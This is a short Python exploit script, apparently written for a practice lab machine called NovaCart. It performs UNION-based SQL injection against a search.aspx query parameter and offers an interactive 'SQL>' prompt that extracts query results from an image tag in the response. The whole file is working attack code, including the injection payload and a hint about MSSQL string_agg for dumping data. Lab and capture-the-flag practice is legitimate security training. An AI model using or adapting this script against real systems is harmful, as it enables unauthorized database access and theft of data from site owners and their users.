#!/usr/bin/env python3

import argparse
import requests
import os
import sys
from urllib.parse import quote

from bs4 import BeautifulSoup

if len(sys.argv) < 2:
    print(f"Usage: .{os.path.basename(__file__)} -t target_url")
    exit(-1)

def sqli(target, query):
    payload = f"""1' union all select 0,0,0,0,({query})--"""
    # print(f"[*] DEBUG: Sending payload: {quote(payload)}")
    req = requests.get(target + "/search.aspx?q=" + quote(payload))
    
    if req.status_code != 200:
        print("[!] Didn't get a valid response back, you've prolly sent an invalid query.")
        return

    return req.text

def extract_result(html):
    soup = None
    sql_result = ""

    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception as e:
        print("[!] Couldn't parse the html response, exiting.")
        print(e)
        exit(-1)

    if soup:
        img_tag = soup.find("img")
        if img_tag:
            sql_result = img_tag["src"]

    return sql_result


def main():
    parser = argparse.ArgumentParser(
        description="""
            SQLi script for the HackSmarter NovaCart machine.
            There's an MSSQL group_concat equivalent called `string_agg` 👀
            Trust, it works.
            """
    )
    parser.add_argument("-t", "--target", help="Target URL, i.e. http://target")
    args = parser.parse_args()

    target = args.target

    while True:
        try:
            print()
            sql_query = input("SQL> ")
            if sql_query == "exit" or sql_query == "quit":
                exit()
            else:
                html = sqli(target, sql_query)
                if html:
                    print()
                    print(extract_result(html))
        except KeyboardInterrupt:
            exit()

if __name__ == "__main__":
    main()
